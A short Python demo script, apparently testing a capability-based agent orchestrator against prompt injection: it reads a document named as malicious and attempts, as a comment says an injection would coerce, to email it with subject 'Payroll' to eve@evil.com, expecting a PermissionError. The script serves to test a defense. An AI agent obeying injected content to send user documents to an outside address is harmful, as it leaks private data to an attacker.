from core.orchestrator import Orchestrator
from tools.read_cloud_doc import read_cloud_doc
from tools.send_email import send_email
from core.capabilities import Val, Capability

TOOLS = {"read_cloud_doc": read_cloud_doc, "send_email": send_email}


def main():
    orch = Orchestrator(TOOLS)

    doc_id = Val(
        value="doc:malicious_notes", caps=Capability(provenance={"type": "User"}, readers="Public")
    )
    doc = orch.call_tool("read_cloud_doc", doc_id=doc_id)

    # Attacker coerces recipient via injected content:
    to = Val(value="eve@evil.com", caps=Capability(provenance={"type": "User"}, readers="Public"))
    subject = Val(value="Payroll", caps=Capability(provenance={"type": "User"}, readers="Public"))
    try:
        orch.call_tool("send_email", to=to, subject=subject, body=doc, attachment=doc)
        print("Unexpectedly allowed")
    except PermissionError as e:
        print("BLOCKED:", e)


if __name__ == "__main__":
    main()
